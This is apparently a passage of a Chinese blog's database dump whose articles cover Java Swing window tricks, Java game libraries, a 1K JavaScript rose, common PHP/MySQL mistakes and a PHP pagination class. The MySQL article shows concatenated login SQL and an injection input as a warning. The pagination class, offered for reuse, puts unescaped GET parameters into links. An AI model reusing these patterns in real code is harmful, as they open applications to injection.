去掉标题栏，我们就有可能要给程序写代码提供最小化,最大化，关闭的操作，如何实现？</p>\r\n\r\n<p>只要给按纽添加MouseListener,</p>\r\n\r\n<p>在mouseClick中的调用</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>jFrame.setExtendedState(jFrame.ICONIFIED); //最小化</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>if(jFrame.getExtendedState() != jFrame.MAXIMIZED_BOTH)</p>\r\n\r\n<p>jFrame.setExtendedState(jFrame.MAXIMIZED_BOTH);</p>\r\n\r\n<p>else</p>\r\n\r\n<p>jFrame.setExtendedState(jFrame.NORMAL);</p>\r\n\r\n<p>// 最大化或正常状态</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>System.exit(0);</p>\r\n\r\n<p>// 关闭，退出程序</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>3)&nbsp;&nbsp;&nbsp;&nbsp; 要拖动窗体的功能：</p>\r\n\r\n<p>只要给窗体中的某个组件添加如下代码就行了：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Point loc = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; Point tmp = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; boolean isDragged = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; private void setDragable() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.addMouseListener(new java.awt.event.MouseAdapter() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void mouseReleased(java.awt.event.MouseEvent e) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isDragged = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jFrame.setCursor(new Cursor(Cursor.DEFAULT_CURSOR));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void mousePressed(java.awt.event.MouseEvent e) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp = new Point(e.getX(), e.getY());</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isDragged = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jFrame.setCursor(new Cursor(Cursor.MOVE_CURSOR));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.addMouseMotionListener(new java.awt.event.MouseMotionAdapter() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void mouseDragged(java.awt.event.MouseEvent e) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(isDragged) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; loc = new Point(jFrame.getLocation().x + e.getX() - tmp.x,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jFrame.getLocation().y + e.getY() - tmp.y);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jFrame.setLocation(loc);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });</p>\r\n\r\n<p>&nbsp;}</p>\r\n\r\n<p>&nbsp; 在初始化该组件的时候调用 setDragable() 就可以使组件具体拖放窗体的功能了。因为可能有</p>\r\n\r\n<p>背景图，可能会重写paint方法，不能在paint方法中调用setDragable()</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>问题四：当我们在试图在JPanel上添加JPanel时，上面的JPanel由于其背景会覆盖下面一层的JPanel？</p>\r\n\r\n<p>解决方法，设置上一层面板的背景为透明； setOpaque(false);</p>\r\n\r\n<p>问题五：找棋子图片，因为希望不遮挡方形区域。</p>\r\n\r\n<p>找PNG格式棋子</p>\r\n',0,1437806755,0,0),(60,16,'java游戏api','<p>最近听说游戏表面上比较火热,也看看有没有机会也进入这个行业混混，说白了，穷人就是为了钱。</p>\r\n\r\n<p>本人对游戏技术不甚了解，没有学过计算机图形学，不懂3dmax，不会用photoshop，等等。技术上只是比较熟悉</p>\r\n\r\n<p>java语言，^_^，啥也不懂，还想搞游戏，是不是非常可笑！</p>\r\n\r\n<p>怎么办？我又不是非要搞，学学，总行吧?</p>\r\n\r\n<p>搞了几年java，不用再去弄c了吧。除了手机游戏之外，国内基本上没有听说用java做其它什么大一点的游戏的。</p>\r\n\r\n<p>基本上没有什么资料。</p>\r\n\r\n<p>看了看sun的网站，竟然有做游戏的api，java3d可以不说了。<br />\r\n不得不提的是jogl，xith3d.<br />\r\n详细情况，可以从下边的官方网站深入了解。<br />\r\nhttp://community.java.net/games/ 是sun的游戏社区，可能是最权威的－－－我没有细看过。</p>\r\n\r\n<p>jogl(Java bindings for OpenGL)是个开源的java项目，官方网站是https://jogl.dev.java.net/，该项目是把</p>\r\n\r\n<p>openGL图形库以java的形式面向对象的实现，开发者一般不需要多么了解openGL就可以作出不错的游戏来，不要</p>\r\n\r\n<p>担心java游戏的性能，良好的java游戏完全可以和用c/c++开发的游戏获得差不多的性能。<br />\r\njogl 究竟是怎么回事，它的底层就是用jni(java native interface)直接调用openGL的内库，并不是重写了哪些</p>\r\n\r\n<p>已有的成果，openGL拥有的图形能力也就是jogl拥有的，openGL拥有的跨平台的能力，当然也是java拥有的。<br />\r\n可以先看看jogl 的演示程序效果，这些demo以java web start的形式运行，如果你要预览一下，需要安装java</p>\r\n\r\n<p>web start程序。（建议：网速不怎么样的，不要点击第一demo，它有大概20M，其他的都比较小）</p>\r\n\r\n<p>demo的网址https://jogl-demos.dev.java.net/</p>\r\n\r\n<p><br />\r\njogl目前好像最高支持openGL1.5。</p>\r\n\r\n<p><br />\r\njoal是java 游戏音频方面的api接口，用于java游戏的声音效果。</p>\r\n\r\n<p>在上边的网站上还能找到相应的教程。</p>\r\n\r\n<p>&nbsp;LWJGL和jogl类似，也是一个基于openGL的java图形库，</p>\r\n\r\n<p>xith3d是一个java3d的游戏引擎，向开发者提供高层的api。它也是不错的开源的项目。包括场景图和渲染组件，官方网站https://xith3d.dev.java.net/</p>\r\n\r\n<p>xith3d能同时兼容jogl、lwjgl，目前主要基于jogl。</p>\r\n',0,1437806809,0,0),(61,1,'这段只有1K的代码能做什么','<p>with(m=Math)C=cos,S=sin,P=pow,R=random;c.width=c.height=f=500;h=-250;function p(a,b,c){if(c&gt;60)return[S(a*7)*(13+5/(.2+P(b*4,4)))-S(b)*50,b*f+50,625+C(a*7)*(13+5/(.2+P(b*4,4)))+b*400,a*1-b/2,a];A=a*2-1;B=b*2-1;if(A*A+B*B&lt;1){if(c&gt;37){n=(j=c&amp;1)?6:4;o=.5/(a+.01)+C(b*125)*3-a*300;w=b*h;return[o*C(n)+w*S(n)+j*610-390,o*S(n)-w*C(n)+550-j*350,1180+C(B+A)*99-j*300,.4-a*.1+P(1-B*B,-h*6)*.15-a*b*.4+C(a+b)/5+P(C((o*(a+1)+(B&gt;0?w:-w))/25),30)*.1*(1-B*B),o/1e3+.7-o*w*3e-6]}if(c&gt;32){c=c*1.16-.15;o=a*45-20;w=b*b*h;z=o*S(c)+w*C(c)+620;return[o*C(c)-w*S(c),28+C(B*.5)*99-b*b*b*60-z/2-h,z,(b*b*.3+P((1-(A*A)),7)*.15+.3)*b,b*.7]}o=A*(2-b)*(80-c*2);w=99-C(A)*120-C(b)*(-h-c*4.9)+C(P(1-b,7))*50+c*2;z=o*S(c)+w*C(c)+700;return[o*C(c)-w*S(c),B*99-C(P(b, 7))*50-c/3-z/1.35+450,z,(1-b/1.2)*.9+a*.1, P((1-b),20)/4+.05]}}setInterval(&#39;for(i=0;i&lt;1e4;i++)if(s=p(R(),R(),i%46/.74)){z=s[2];x=~~(s[0]*f/z-h);y=~~(s[1]*f/z-h);if(!m[q=y*f+x]|m[q]&gt;z)m[q]=z,a.fillStyle=&quot;rgb(&quot;+~(s[3]*h)+&quot;,&quot;+~(s[4]*h)+&quot;,&quot;+~(s[3]*s[3]*-80)+&quot;)&quot;,a.fillRect(x,y,1,1)}&#39;,0)</p>\r\n\r\n<p>上面这段JavaScript代码一共有1018个字符，每个字符占一个字节，一共1018B，约等于1K。这1K大小的js能做什么，试一下就知道。</p>\r\n\r\n<p>是不是很绚丽。我想，写出这个1K大小的js，你至少需要有绘画知识(画出玫瑰)，色彩原理知识(玫瑰红颜色渐变)，数学算法知识(计算各像素点)，计算机动画知识(玫瑰出现效果)，编程知识(会用javascript)。看看，想做好一件事多不容易，当一个好程序员有多难！</p>\r\n\r\n<p>想了解这段代码的工作原理的朋友请访问这里:http://www.romancortes.com/blog/1k-rose/</p>\r\n',0,1437806970,0,0),(62,10,'PHP开发者常犯的10个MySQL错误','<p>数据库是Web大多数应用开发的基础。如果你是用PHP，那么大多数据库用的是MYSQL也是LAMP架构的重要部分。</p>\r\n\r\n<p>PHP看起来很简单，一个初学者也可以几个小时内就能开始写函数了。但是建立一个稳定、可靠的数据库确需要时间和经验。下面就是一些这样的经验，不仅仅是MYSQL，其他数据库也一样可以参考。</p>\r\n\r\n<p>1.使用MyISAM而不是InnoDB</p>\r\n\r\n<p>MySQL有很多的数据库引擎，单一般也就用MyISAM和InnoDB。</p>\r\n\r\n<p>MyISAM 是默认使用的。但是除非你是建立一个非常简单的数据库或者只是实验性的，那么到大多数时候这个选择是错误的。MyISAM不支持外键的约束，这是保证数据完整性的精华所在啊。另外，MyISAM会在添加或者更新数据的时候将整个表锁住，这在以后的扩展性能上会有很大的问题。</p>\r\n\r\n<p>解决办法很简单：使用InnoDB。</p>\r\n\r\n<p>2.使用PHP的mysql方法</p>\r\n\r\n<p>PHP从一开始就提供了MySQL的函数库。很多程序都依赖于mysql_connect、mysql_query、mysql_fetch_assoc等等，但是PHP手册中建议：</p>\r\n\r\n<p>如果你使用的MySQL版本在4.1.3之后，那么强烈建议使用mysqli扩展。</p>\r\n\r\n<p>mysqli，或者说MySQL的高级扩展，有一些优点：</p>\r\n\r\n<p>有面向对象的接口</p>\r\n\r\n<p>prepared statements(预处理语句，可以有效防止SQL-注入攻击，还能提高性能)</p>\r\n\r\n<p>支持多种语句和事务</p>\r\n\r\n<p>另外，如果你想支持多数据库那么应该考虑一下PDO。</p>\r\n\r\n<p>3.不过滤用户输入</p>\r\n\r\n<p>应该是：永远别相信用户的输入。用后端的PHP来校验过滤每一条输入的信息，不要相信Javascript。像下面这样的SQL语句很容易就会被攻击：</p>\r\n\r\n<p>$username = $_POST[&quot;name&quot;];<br />\r\n$password = $_POST[&quot;password&quot;];<br />\r\n$sql = &quot;SELECT userid FROM usertable WHERE username=?$username?AND password=?$password?;&quot;; // run query...</p>\r\n\r\n<p>这样的代码，如果用户输入&rdquo;admin&rsquo;;&rdquo;那么，就相当于下面这条了：</p>\r\n\r\n<p>SELECT userid FROM usertable WHERE username=?admin?;</p>\r\n\r\n<p>这样入侵者就能不输入密码，就通过admin身份登录了。</p>\r\n\r\n<p>4.不使用UTF-8</p>\r\n\r\n<p>那些英美国家的用户，很少考虑语言的问题，这样就造成很多产品就不能在其他地方通用。还有一些GBK编码的，也会有很多的麻烦。</p>\r\n\r\n<p>UTF-8解决了很多国际化的问题。虽然PHP6才能比较完美的解决这个问题，但是也不妨碍你将MySQL的字符集设置为UTF-8。</p>\r\n\r\n<p>5.该用SQL的地方使用PHP</p>\r\n\r\n<p>如果你刚接触MySQL，有时候解决问题的时候可能会先考虑使用你熟悉的语言来解决。这样就可能造成一些浪费和性能比较差的情况。比如：计算平均值的时候不适用MySQL原生的AVG()方法，而是用PHP将所有值循环一遍然后累加计算平均值。</p>\r\n\r\n<p>另外还要注意SQL查询中的PHP循环。通常，在取得所有结果之后再用PHP来循环的效率更高。</p>\r\n\r\n<p>一般在处理大量数据的时候使用强有力的数据库方法，更能提高效率。</p>\r\n\r\n<p>6.不优化查询</p>\r\n\r\n<p>99%的PHP性能问题都是数据库造成的，一条糟糕的SQL语句可能让你的整个程序都非常慢。MySQL的EXPLAIN statement，Query Profiler，many other tools的这些工具可以帮你找出那些调皮的SELECT。</p>\r\n\r\n<p>7.使用错误的数据类型</p>\r\n\r\n<p>MySQL提供一系列数字、字符串、时间等的数据类型。如果你想存储日期，那么就是用DATE或者DATETIME类型，使用整形或者字符串会让事情更加复杂。</p>\r\n\r\n<p>有时候你想用自己定义的数据类型，例如，使用字符串存储序列化的PHP对象。数据库的添加可能很容易，但是这样的话，MySQL就会变得很笨重，而且以后可能导致一些问题。</p>\r\n\r\n<p>8.在SELECT查询中使用*</p>\r\n\r\n<p>不要使用*在表中返回所有的字段，这会非常的慢。你只需要取出你需要的数据字段。如果你需要取出所有的字段，那么可能你的表需要更改了。</p>\r\n\r\n<p>9.索引不足或者过度索引</p>\r\n\r\n<p>一般来说，应该索引出现在SELECT语句中WHERE后面所有的字段。</p>\r\n\r\n<p>例如，假如我们的用户表有一个数字的ID(主键)和email地址。登录之后，MySQL应该通过email找到相应的ID。通过索引，MySQL可以通过搜索算法很快的定位email。如果没有索引，MySQL就需要检查每一项记录直到找到。</p>\r\n\r\n<p>这样的话，你可能想给每一个字段都添加索引，但是这样做的后果就是在你更新或者添加的时候，索引就会重新做一遍，当数据量大的时候，就会有性能问题。所以，只在需要的字段做索引。</p>\r\n\r\n<p>10.不备份</p>\r\n\r\n<p>也许不常发生，但是数据库损毁，硬盘坏了、服务停止等等，这些都会对数据造成灾难性的破坏。所以你一定要确保自动备份数据或者保存副本。</p>\r\n\r\n<p>11.另外：不考虑其他数据库</p>\r\n\r\n<p>MySQL可能是PHP用的最多的数据库了，但是也不是唯一的选择。 PostgreSQL和Firebird也是竞争者，他们都开源，而且不被某些公司所控制。微软提供SQL Server Express，Oracle有10g Express，这些企业级的也有免费版。SQLite对于一些小型的或者嵌入式应用来说也是不错的选择。<br />\r\n原文出处：http://www.lupaworld.com/home-space-uid-328269-do-blog-id-242408.html</p>\r\n',0,1437807196,0,0),(63,10,'一个PHP分页类','<p>&lt;?php</p>\r\n\r\n<p>class Page</p>\r\n\r\n<p>{</p>\r\n\r\n<p>private $nums;//总数据条量</p>\r\n\r\n<p>private $pagesize;//每页大小</p>\r\n\r\n<p>private $totalpages;//总页数</p>\r\n\r\n<p>private $navcounts;//分页栏显示分页数量</p>\r\n\r\n<p>private $curpage=1;//当前页</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>private $firstpage=&#39;首页&#39;;//首页显示字符</p>\r\n\r\n<p>private $previouspage=&#39;上一页&#39;;//上一页显示字符</p>\r\n\r\n<p>private $nextpage=&#39;下一页&#39;;//下一页显示字符</p>\r\n\r\n<p>private $endpage=&#39;尾页&#39;;//尾页显示字符</p>\r\n\r\n<p>private $actionjs=false;//翻页时是否是执行js函数还是链接跳转</p>\r\n\r\n<p>private $jsfunction=&#39;&#39;;//翻页时需要执行的js函数名称，该函数只能接受将翻到的页数作为参数</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>private $url;//链接跳转的地址头</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//初始化函数，属性赋值</p>\r\n\r\n<p>public function init($nums,$pagesize,$navcounts,$actionjs=false,$jsfunction=&#39;&#39;)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$this-&gt;nums&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $nums;//总数据条量</p>\r\n\r\n<p>$this-&gt;pagesize&nbsp;&nbsp; = $pagesize;//每页大小</p>\r\n\r\n<p>$this-&gt;navcounts&nbsp; = $navcounts;//分页栏显示分页数量</p>\r\n\r\n<p>$this-&gt;totalpages = ceil($nums/$pagesize);//总页数</p>\r\n\r\n<p>if(empty($this-&gt;totalpages)) $this-&gt;totalpages = 1;</p>\r\n\r\n<p>$this-&gt;curpage&nbsp;&nbsp;&nbsp; = isset($_POST[&#39;page&#39;])?intval($_POST[&#39;page&#39;]):intval($_GET[&#39;page&#39;]);//当前页</p>\r\n\r\n<p>if(empty($this-&gt;curpage)) $this-&gt;curpage = 1;</p>\r\n\r\n<p>if($this-&gt;curpage&gt;$this-&gt;totalpages) $this-&gt;curpage = $this-&gt;totalpages;</p>\r\n\r\n<p>$this-&gt;actionjs&nbsp;&nbsp; = ($actionjs)?true:false;//翻页是否执行js</p>\r\n\r\n<p>$this-&gt;jsfunction = $jsfunction;//需要执行的js函数</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//不存在QUERY_STRING时</p>\r\n\r\n<p>if(empty($_SERVER[&#39;QUERY_STRING&#39;]))</p>\r\n\r\n<p>&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp; $this-&gt;url = $_SERVER[&#39;REQUEST_URI&#39;].&quot;?page=&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp; }</p>\r\n\r\n<p>//存在QUERY_STRING时</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp; {</p>\r\n\r\n<p>//去掉get的参数中page的那部分</p>\r\n\r\n<p>$_get = $_GET;</p>\r\n\r\n<p>if(isset($_get[&#39;page&#39;])) unset($_get[&#39;page&#39;]);</p>\r\n\r\n<p>$query_string = array();</p>\r\n\r\n<p>foreach($_get as $_k =&gt; $_v)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$query_string[] = $_k.&#39;=&#39;.$_v;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; $query_string = implode(&#39;&amp;&#39;,$query_string);</p>\r\n\r\n<p>//提交的get参数中只包含page</p>\r\n\r\n<p>if(empty($query_string))</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$this-&gt;url = substr($_SERVER[&#39;REQUEST_URI&#39;],0,strpos($_SERVER[&#39;REQUEST_URI&#39;],&#39;?&#39;)).&#39;?page=&#39;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>else</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$this-&gt;url = substr($_SERVER[&#39;REQUEST_URI&#39;],0,strpos($_SERVER[&#39;REQUEST_URI&#39;],&#39;?&#39;)).&#39;?&#39;.$query_string.&#39;&amp;page=&#39;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//设置首页、上一页、下一页、尾页的字符</p>\r\n\r\n<p>public function setLabel($firstpage,$previouspage,$nextpage,$endpage)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$this-&gt;firstpage= htmlspecialchars($firstpage);</p>\r\n\r\n<p>$this-&gt;previouspage= htmlspecialchars($previouspage);</p>\r\n\r\n<p>$this-&gt;nextpage= htmlspecialchars($nextpage);</p>\r\n\r\n<p>$this-&gt;endpage= htmlspecialchars($endpage);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回总的页数</p>\r\n\r\n<p>public function totalPage()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>return $this-&gt;totalpages;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//返回当前页数</p>\r\n\r\n<p>public function curPage()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>return $this-&gt;curpage;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//分页的数字部分(当前页前面的部分)</p>\r\n\r\n<p>public function navPart1()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return = array();</p>\r\n\r\n<p>//当前页前最多显示的页数</p>\r\n\r\n<p>$part1 = ($this-&gt;navcounts % 2 == 0)?($this-&gt;navcounts/2-1):(($this-&gt;navcounts-1)/2);</p>\r\n\r\n<p>//如果往前翻页的页数不够最大数</p>\r\n\r\n<p>if($this-&gt;curpage &lt;= $part1)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>if($this-&gt;curpage&gt;1)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$start = 1;</p>\r\n\r\n<p>for($i=$start;$i&lt;$this-&gt;curpage;$i++)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return[] = $i;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//往前翻页的页数是最大数</p>\r\n\r\n<p>else</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$start = $this-&gt;curpage - $part1;</p>\r\n\r\n<p>for($i=$start;$i&lt;$this-&gt;curpage;$i++)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return[] = $i;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>return $return;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//分页的数字部分(当前页后面的部分)</p>\r\n\r\n<p>public function navPart2()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return = array();</p>\r\n\r\n<p>//当前页后最多显示的页数</p>\r\n\r\n<p>$part2 = ($this-&gt;navcounts % 2 == 0)?($this-&gt;navcounts/2):(($this-&gt;navcounts-1)/2);</p>\r\n\r\n<p>//如果往后翻页的页数不够最大数</p>\r\n\r\n<p>if($this-&gt;curpage + $part2 &gt; $this-&gt;totalpages)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>if($this-&gt;curpage&lt;$this-&gt;totalpages)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$start = $this-&gt;curpage + 1;</p>\r\n\r\n<p>for($i=$start;$i&lt;=$this-&gt;totalpages;$i++)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return[] = $i;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//往后翻页的页数是最大数</p>\r\n\r\n<p>else</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$start = $this-&gt;curpage + 1;</p>\r\n\r\n<p>for($i=$start;$i&lt;$start+$part2;$i++)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return[] = $i;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>return $return;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//显示的分页HTML代码(格式一)</p>\r\n\r\n<p>public function show1()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return = &#39;&#39;;</p>\r\n\r\n<p>//如果是执行js</p>\r\n\r\n<p>if($this-&gt;actionjs)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>//当前页不是首页</p>\r\n\r\n<p>if($this-&gt;curpage&gt;1)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;1&#39;)\\&quot;&gt;&quot;.$this-&gt;firstpage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;&quot;.($this-&gt;curpage-1).&quot;&#39;)\\&quot;&gt;&quot;.$this-&gt;previouspage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$part1 = $this-&gt;navPart1();</p>\r\n\r\n<p>foreach($part1 as $_k =&gt; $_v)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;&quot;.$_v.&quot;&#39;)\\&quot;&gt;&quot;.$_v.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&quot;.$this-&gt;curpage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>//当前页不是最后一页</p>\r\n\r\n<p>if($this-&gt;curpage&lt;$this-&gt;totalpages)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$part2 = $this-&gt;navPart2();</p>\r\n\r\n<p>foreach($part2 as $_k =&gt; $_v)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;&quot;.$_v.&quot;&#39;)\\&quot;&gt;&quot;.$_v.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;&quot;.($this-&gt;curpage+1).&quot;&#39;)\\&quot;&gt;&quot;.$this-&gt;nextpage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$return .= &quot;&lt;span onclick=\\&quot;&quot;.$this-&gt;jsfunction.&quot;(&#39;&quot;.$this-&gt;totalpages.&quot;&#39;)\\&quot;&gt;&quot;.$this-&gt;endpage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>//是打开链接</p>\r\n\r\n<p>else</p>\r\n\r\n<p>{</p>\r\n\r\n<p>//当前页不是首页</p>\r\n\r\n<p>if($this-&gt;curpage&gt;1)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a href=&#39;&quot;.$this-&gt;url.&quot;1&#39;&gt;&quot;.$this-&gt;firstpage.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a href=&#39;&quot;.$this-&gt;url.($this-&gt;curpage-1).&quot;&#39;&gt;&quot;.$this-&gt;previouspage.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$part1 = $this-&gt;navPart1();</p>\r\n\r\n<p>foreach($part1 as $_k =&gt; $_v)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a href=&#39;&quot;.$this-&gt;url.$_v.&quot;&#39;&gt;&quot;.$_v.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&quot;.$this-&gt;curpage.&quot;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>//当前页不是最后一页</p>\r\n\r\n<p>if($this-&gt;curpage&lt;$this-&gt;totalpages)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$part2 = $this-&gt;navPart2();</p>\r\n\r\n<p>foreach($part2 as $_k =&gt; $_v)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a href=&#39;&quot;.$this-&gt;url.$_v.&quot;&#39;&gt;&quot;.$_v.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a href=&#39;&quot;.$this-&gt;url.($this-&gt;curpage+1).&quot;&#39;&gt;&quot;.$this-&gt;nextpage.&quot;&lt;/a&gt;&lt;/span&gt;&amp;nbsp;&quot;;</p>\r\n\r\n<p>$return .= &quot;&lt;span&gt;&lt;a 